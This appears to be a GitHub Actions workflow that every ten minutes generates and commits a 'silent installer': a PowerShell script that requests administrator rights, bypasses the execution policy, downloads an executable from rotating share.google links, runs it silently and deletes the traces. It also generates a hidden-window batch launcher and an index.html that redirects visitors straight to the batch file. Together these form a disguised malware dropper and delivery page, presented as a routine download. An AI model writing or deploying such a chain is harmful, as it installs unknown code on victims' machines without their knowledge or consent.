name: Update Silent Installer

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Silent Installer
      run: |
        # Define your download links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 6))
        current_link=${links[$link_index]}
        
        echo "Using link: $current_link"
        
        # Create a PowerShell script instead of VBS
        cat > installer.ps1 << 'EOF'
        # Check if running with elevated privileges
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            # Restart with elevation
            Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        
        # Read URL from file
        $tempPath = $env:TEMP
        $urlFile = "$tempPath\download_url.txt"
        $installerPath = "$tempPath\installer.exe"
        
        $downloadUrl = Get-Content $urlFile
        
        # Download using Invoke-WebRequest (more reliable than XMLHTTP)
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath -UseBasicParsing
            
            # Run installer silently
            Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
            
            # Clean up
            Remove-Item $installerPath -Force
            Remove-Item $urlFile -Force
        } catch {
            # Log error to temp file
            "Error: $_" | Out-File "$tempPath\install_error.txt"
        }
        EOF
        
        # Create batch file that copies URL and runs PowerShell
        cat > run.bat << 'EOF'
        @echo off
        copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0installer.ps1"
        EOF
        
        # Create URL file
        echo "$current_link" > url.txt
        
        # Create index.html
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=run.bat"></head><body><p>Downloading...</p></body></html>' > index.html
        
        # Commit and push
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add installer.ps1 run.bat url.txt index.html
        git commit -m "Update installer" || exit 0
        git push
